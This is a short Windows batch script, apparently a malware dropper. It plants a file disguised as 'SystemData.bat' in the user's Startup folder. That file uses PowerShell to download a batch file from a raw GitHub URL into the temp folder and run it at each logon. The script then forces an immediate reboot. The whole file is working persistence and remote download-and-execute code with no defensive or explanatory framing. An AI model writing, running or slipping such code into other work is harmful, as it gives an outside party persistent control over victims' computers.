@echo off

set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo @echo off > "%startup%\SystemData.bat"
echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ4.bat" >> "%startup%\SystemData.bat"
echo set "arquivo=%%TEMP%%\LZX.bat" >> "%startup%\SystemData.bat"
echo powershell -command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'" >> "%startup%\SystemData.bat"
echo start "" "%%arquivo%%" >> "%startup%\SystemData.bat"
echo exit >> "%startup%\SystemData.bat"

shutdown /r /t 0
